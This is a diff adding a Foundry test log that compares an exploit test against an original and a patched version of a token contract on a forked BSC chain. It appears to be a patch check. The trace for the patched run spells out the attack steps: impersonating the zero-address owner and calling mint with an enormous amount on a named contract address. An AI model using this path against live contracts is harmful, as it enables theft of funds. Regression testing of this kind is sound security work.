@@ -1,0 +1,41 @@
+===== original batch =====
+Compiling 20 files with Solc 0.8.26
+Solc 0.8.26 finished in 442.30ms
+Compiler run successful!
+2026-10-09T13:13:31.174977Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/126641849"
+
+Ran 1 test for test/Original_0.t.sol:ExploitOriginal_0
+[PASS] testExploit() (gas: 68887)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.19s (4.19s CPU time)
+
+Ran 1 test suite in 10.63s (8.19s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+
+===== patched batch =====
+Compiling 1 files with Solc 0.8.26
+Solc 0.8.26 finished in 365.28ms
+Compiler run successful!
+2026-10-09T13:13:44.937880Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/126641879"
+
+Ran 1 test for test/Patched_0.t.sol:ExploitPatched_0
+[FAIL: panic: arithmetic underflow or overflow (0x11)] testExploit() (gas: 42548)
+Traces:
+  [42548] ExploitPatched_0::testExploit()
+    ├─ [2605] 0x6bf3a93793e52f75543c92AfEC4636559988e3c1::owner() [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    ├─ [24834] 0x6bf3a93793e52f75543c92AfEC4636559988e3c1::reflectionFromToken(1, false) [staticcall]
+    │   └─ ← [Return] 4708740046475929366444785213445026506096288327809216730652547906575506180594 [4.708e75]
+    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ [2735] 0x6bf3a93793e52f75543c92AfEC4636559988e3c1::mint(ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4708740046475929366444785213445026506096288327809216730652547906575506180594 [4.708e75])
+    │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
+    └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 12.91s (4.32s CPU time)
+
+Ran 1 test suite in 14.99s (12.91s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Patched_0.t.sol:ExploitPatched_0
+[FAIL: panic: arithmetic underflow or overflow (0x11)] testExploit() (gas: 42548)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
